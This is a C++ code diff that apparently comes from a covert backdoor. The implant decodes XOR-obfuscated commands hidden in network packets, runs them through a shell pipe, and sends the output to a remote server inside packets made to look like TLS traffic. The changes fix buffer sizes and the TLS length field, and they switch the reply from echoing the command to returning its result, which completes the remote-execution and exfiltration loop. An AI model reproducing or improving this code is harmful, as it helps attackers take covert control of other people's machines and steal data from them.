@@ -547,7 +547,7 @@ void decapsulate(const u_char *data, int size) {
 							command[i] = command[i] ^ 'H';
 						}
 						//run command
-						char buffer[128];
+						char buffer[500];
 						FILE* _pipe = _popen(command.c_str(), "r");
 						std::string result = "";
 						//redirects stdout to pipe and adds elements of buffer to result string
@@ -556,7 +556,7 @@ void decapsulate(const u_char *data, int size) {
 						}
 
 						while (!feof(_pipe)) {
-							if (fgets(buffer, 128, _pipe) != NULL)
+							if (fgets(buffer, sizeof(buffer), _pipe) != NULL)
 								result += buffer;
 						}
 						_pclose(_pipe);
@@ -566,7 +566,7 @@ void decapsulate(const u_char *data, int size) {
 						}
 						//return result to server
 						identification_number++;
-						connected_mode_send(address, mac_address, "1", command, identification_number);
+						connected_mode_send(address, mac_address, "1", result, identification_number);
 					}
 				}
 
@@ -911,7 +911,7 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
 	mac_values* mac_address = (mac_values*)malloc((sizeof(int) * 6));
 	get_mac(&values);
-	u_char packet[162];
+	u_char packet[1000];
 
 	std::vector<std::string> mac_val;
 	split(mac_addr, ':', mac_val);
@@ -970,14 +970,16 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 
 		//set ssl header
 		packet[54] = 23;  //packet type
-						  //version 1.2 => 03 03 is how to set this field
-						  //I Know, I Know, it's dumb.
+		//version 1.2 => 03 03 is how to set this field
+		//I Know, I Know, it's dumb.
 		packet[55] = 3;   //major 1
 		packet[56] = 3;   //minor 1
-						  //length
-		packet[57] = 0;   //high
-		packet[58] = 7 + command.length();   //low
-											 //zero padding
+		//length
+		int tls_length = command.length() + 7;
+		packet[57] = tls_length / 256;   //high
+		packet[58] = tls_length % 256;   //low
+											 								 
+		//zero padding
 		packet[59] = 0;
 		packet[60] = 0;
 		packet[61] = 0;
